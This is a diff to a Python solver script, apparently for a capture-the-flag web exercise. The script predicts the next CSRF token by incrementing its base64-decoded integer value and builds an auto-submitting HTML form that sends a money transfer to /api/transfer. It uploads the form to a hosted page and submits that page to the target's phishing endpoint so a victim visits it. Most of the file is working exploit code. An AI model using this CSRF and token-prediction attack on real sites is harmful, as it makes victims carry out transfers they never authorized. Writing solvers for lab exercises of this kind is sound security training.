@@ -1,7 +1,7 @@
 import sys
 from pathlib import Path
 sys.path.append(str(Path(__file__).resolve().parent.parent))
-from utils import get_session, HostedWebsiteCSE
+from utils import get_session, HostedWebsiteCSE, find_flag
 
 import base64
 
@@ -35,14 +35,11 @@ class Solver:
         next_csrf_token_int = curr_csrf_token_int + 1
         next_csrf_token = self.int_to_base64(next_csrf_token_int)
 
-        print(curr_csrf_token, curr_csrf_token_int)
-        print(next_csrf_token, next_csrf_token_int)
-
         PAYLOAD = f'''<form method="POST" action="{BASE_URL}/api/transfer" id="phishForm">
-    <input type="hidden" name="csrf_token" value="{next_csrf_token}">
-    <input type="text" name="username" placeholder="Username to Send To (can be yourself)" value="z5437741">
-    <input type="number" name="amount" placeholder="Amount" step="1" value="1">
-    <input type="submit" value="Transfer 💸">
+    <input type="text"   name="csrf_token" value="{next_csrf_token}">
+    <input type="text"   name="username"   value="z5437741">
+    <input type="number" name="amount"     value="1">
+    <input type="submit">
 </form>
 
 <script>
@@ -52,10 +49,10 @@ class Solver:
 </script>'''
 
         remote_path = self.hosted_website.upload_file(HTML_FILENAME, PAYLOAD.encode())
-        print(remote_path)
+        self.session.post(f"{BASE_URL}/phish", data={ "url": remote_path })
 
-        response = self.session.post(f"{BASE_URL}/phish", data={ "url": remote_path })
-        print(response.text)
+        response = self.session.get(BASE_URL)
+        find_flag(response.text)
 
 if __name__ == "__main__":
     Solver().main()
